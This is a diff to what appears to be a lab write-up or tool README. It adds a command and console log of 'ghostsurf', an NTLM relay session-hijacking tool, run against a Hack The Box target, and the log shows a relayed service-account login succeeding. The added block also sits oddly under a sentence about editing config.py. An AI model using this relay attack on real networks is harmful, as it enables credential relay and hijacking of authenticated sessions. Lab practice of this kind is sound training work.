@@ -242,6 +242,44 @@ self.remove_target = False
 This line needs to be added to the `lib/relay/utils/config.py` file 
 
 ```python
+python3 ghostsurf.py -t http://gpz-op26-secure.ghostlink.htb/ -dkr
 
+  ,--,   .-. .-. .---.    .---.  _______  .---. .-. .-.,---.    ,---.
+.' .'    | | | |/ .-. )  ( .-._)|__   __|( .-._)| | | || .-.\   | .-'
+|  |  __ | `-' || | |(_)(_) \     )| |  (_) \   | | | || `-'/   | `-.
+\  \ ( _)| .-. || | | | _  \ \   (_) |  _  \ \  | | | ||   (    | .-'
+ \  `-) )| | |)|\ `-' /( `-'  )    | | ( `-'  ) | `-')|| |\ \   | |
+ )\____/ /(  (_) )---'  `----'     `-'  `----'  `---(_)|_| \)\  )\|
+(__)    (__)    (_)  NTLM relay browser session hijacking  (__)(__)
+
+
+[+] Impacket Library Installation Path: /home/kali/htb/ghostlink/ghostsurf/venv/lib/python3.14/site-packages/impacket
+[*] Target: http://gpz-op26-secure.ghostlink.htb/
+[*] SOCKS proxy started. Listening on 127.0.0.1:1080
+[*] HTTP Socks Plugin loaded..
+[*] HTTPS Socks Plugin loaded..
+[*] SOCKS proxy: 127.0.0.1:1080
+[*] Kernel-mode auth workaround ENABLED
+[*] Keep-relaying mode ENABLED (will reload targets after success)
+[*] Setting up SMB Server on port 445
+[*] Setting up HTTP Server on port 80
+ * Serving Flask app 'lib.relay.servers.socksserver'
+ * Debug mode: off
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+Type help for list of commands
+ghostsurf> [*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Client requested path: /healthcheck
+[*] (HTTP): Connection from 10.129.65.93 controlled, attacking target http://gpz-op26-secure.ghostlink.htb
+[*] (HTTP): Client requested path: /healthcheck
+[*] HTTP server returned error code 200, treating as a successful login
+[*] (HTTP): Authenticating connection from GHOSTLINK/SVC_CANARY@10.129.65.93 against http://gpz-op26-secure.ghostlink.htb SUCCEED [1]
+[*] SOCKS: Adding GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb(80) to active SOCKS connection. Enjoy
+[+] KeepAlive Timer reached. Updating connections
+[+] Calling keepAlive() for GHOSTLINK/SVC_CANARY@gpz-op26-secure.ghostlink.htb:80
 ```
+
+
 
